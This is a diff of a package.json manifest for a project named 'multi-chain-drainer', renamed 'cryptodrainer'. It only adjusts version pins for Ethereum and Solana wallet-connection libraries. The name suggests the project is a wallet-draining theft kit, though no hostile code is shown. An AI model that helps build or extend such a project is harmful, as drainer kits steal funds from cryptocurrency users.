@@ -1,5 +1,5 @@
 {
-  "name": "multi-chain-drainer",
+  "name": "cryptodrainer",
   "version": "1.0.0",
   "private": true,
   "scripts": {
@@ -9,21 +9,23 @@
     "lint": "next lint"
   },
   "dependencies": {
-    "@rainbow-me/rainbowkit": "^2.2.10",
-    "@solana/wallet-adapter-react": "0.15.35",
-    "@solana/wallet-adapter-react-ui": "0.9.35",
-    "@solana/web3.js": "^1.98.4",
-    "@tanstack/react-query": "5.59.0",
-    "ethers": "6.13.4",
-    "next": "^14.2.35",
+    "next": "14.2.3",
     "react": "18.3.1",
     "react-dom": "18.3.1",
+    "@rainbow-me/rainbowkit": "1.3.6",
+    "wagmi": "2.10.2",
     "viem": "2.21.28",
-    "wagmi": "^2.19.5"
+    "@tanstack/react-query": "5.59.0",
+    "@solana/web3.js": "1.95.3",
+    "@solana/wallet-adapter-react": "0.15.35",
+    "@solana/wallet-adapter-react-ui": "0.9.35",
+    "@solana/wallet-adapter-base": "^0.9.23",
+    "@solana/wallet-adapter-wallets": "^0.19.32",
+    "ethers": "6.13.4"
   },
   "devDependencies": {
+    "tailwindcss": "3.4.14",
     "autoprefixer": "10.4.20",
-    "postcss": "8.5.1",
-    "tailwindcss": "3.4.14"
+    "postcss": "8.5.1"
   }
 }
